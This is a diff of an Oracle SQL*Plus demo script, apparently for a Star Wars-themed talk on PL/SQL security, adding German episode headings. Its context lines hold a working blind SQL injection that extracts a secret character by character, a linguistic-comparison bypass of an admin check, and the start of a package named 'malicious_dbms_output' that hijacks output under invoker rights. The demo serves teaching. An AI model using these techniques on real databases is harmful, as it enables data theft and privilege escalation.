@@ -13,6 +13,10 @@ alter session set nls_date_format='dd.MM.yyyy hh:mi:ss';
 rem update deathstar_rooms...
 set echo on
 cl scr
+--------------------------------------------------------------------------------------------------------
+-- Episode 2: Angriff der Blind-Injections
+--------------------------------------------------------------------------------------------------------
+
 connect sabine/sabine
 
 select deathstar.room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''a'') --') result from dual;
@@ -65,10 +69,15 @@ end;
 #pause
 
 #pause/**/
+cl scr
+--------------------------------------------------------------------------------------------------------
+-- Episode 3: Die Rache des Room-Codes
+--------------------------------------------------------------------------------------------------------
 
 connect deathstar/deathstar
 cl scr
 select code from deathstar.deathstar_rooms;
+
 #pause
 cl scr
 select * from deathstar.user_roles;
@@ -76,15 +85,17 @@ select * from deathstar.users;
 #pause
 call deathstar.room_info.allow_room_access(2, 1);
 #pause
-cl scr
 select * from deathstar.user_roles;
 #pause
-cl scr
 select * from deathstar.log_201911;
 #pause
 
 #pause/**/
 cl scr
+--------------------------------------------------------------------------------------------------------
+-- Episode 4: Invoker’s Hoffnung
+--------------------------------------------------------------------------------------------------------
+
 
 connect sabine/sabine
 #pause
@@ -124,6 +135,9 @@ select * from secret_dump;
 
 #pause/**/
 cl scr
+--------------------------------------------------------------------------------------------------------
+-- Episode 6: Die Rückkehr des Social Engineers
+--------------------------------------------------------------------------------------------------------
 
 ALTER SESSION SET NLS_SORT = BINARY_AI NLS_COMP = LINGUISTIC;
 
@@ -147,6 +161,11 @@ connect deathstar/deathstar
 select is_admin('Ädmin') from dual;
 #pause
 cl scr
+
+--------------------------------------------------------------------------------------------------------
+-- Episode 7: Das Erwachen des Rebellen-DBAs
+--------------------------------------------------------------------------------------------------------
+
 connect sabine/sabine
 
 create or replace package malicious_dbms_output authid current_user as
@@ -154,6 +173,7 @@ create or replace package malicious_dbms_output authid current_user as
 end;
 /
 #pause
+cl scr
 
 create or replace package body malicious_dbms_output as
 
